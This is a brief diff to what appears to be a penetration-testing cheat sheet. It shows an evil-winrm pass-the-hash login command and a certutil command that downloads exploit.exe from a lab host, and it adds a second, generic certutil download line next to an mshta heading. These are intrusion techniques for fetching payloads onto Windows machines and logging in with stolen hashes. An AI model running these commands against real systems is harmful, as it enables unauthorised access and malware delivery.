@@ -141,6 +141,8 @@ ruby evil-winrm.rb -i IP -u <username> -H '<hash>' -s '/path/to/scripts'
 [Cert Util]
 ```
 certutil.exe -urlcache -split -f http[:]//10.10.10.10/exploit.exe
+
+certutil.exe -urlcache -f UrlAddress C:/File.txt
 ```
 
 [mshta]
